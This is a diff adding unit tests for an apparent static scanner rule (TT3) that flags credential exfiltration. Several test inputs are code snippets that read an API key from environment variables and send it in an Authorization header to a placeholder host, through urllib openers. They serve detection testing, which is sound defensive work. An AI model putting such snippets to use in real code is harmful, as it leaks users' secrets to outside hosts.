@@ -120,6 +120,41 @@ class TestCredentialExfiltration:
         tt3 = [f for f in findings if f.rule_id == "TT3"]
         assert len(tt3) >= 1
 
+    def test_nested_environ_subscript_in_request_headers_to_urlopen(self):
+        code = (
+            "import os, urllib.request\n"
+            'req = urllib.request.Request("https://example.invalid", '
+            'headers={"Authorization": "Bearer " + os.environ["API_KEY"]})\n'
+            "urllib.request.urlopen(req)\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_nested_environ_subscript_in_direct_request_to_urlopen(self):
+        code = (
+            "import os, urllib.request\n"
+            'urllib.request.urlopen(urllib.request.Request("https://example.invalid", '
+            'headers={"Authorization": "Bearer " + os.environ["API_KEY"]}))\n'
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_nested_environ_subscript_in_request_to_inline_opener(self):
+        code = (
+            "import os, urllib.request\n"
+            'req = urllib.request.Request("https://example.invalid", '
+            'headers={"Authorization": "Bearer " + os.environ["API_KEY"]})\n'
+            "urllib.request.build_opener().open(req)\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_public_request_header_does_not_report_tt3(self):
+        code = (
+            "import urllib.request\n"
+            'req = urllib.request.Request("https://example.invalid", '
+            'headers={"Authorization": "Bearer public"})\n'
+            "urllib.request.urlopen(req)\n"
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
     def test_getenv_to_httpx(self):
         code = (
             "import os, httpx\n"
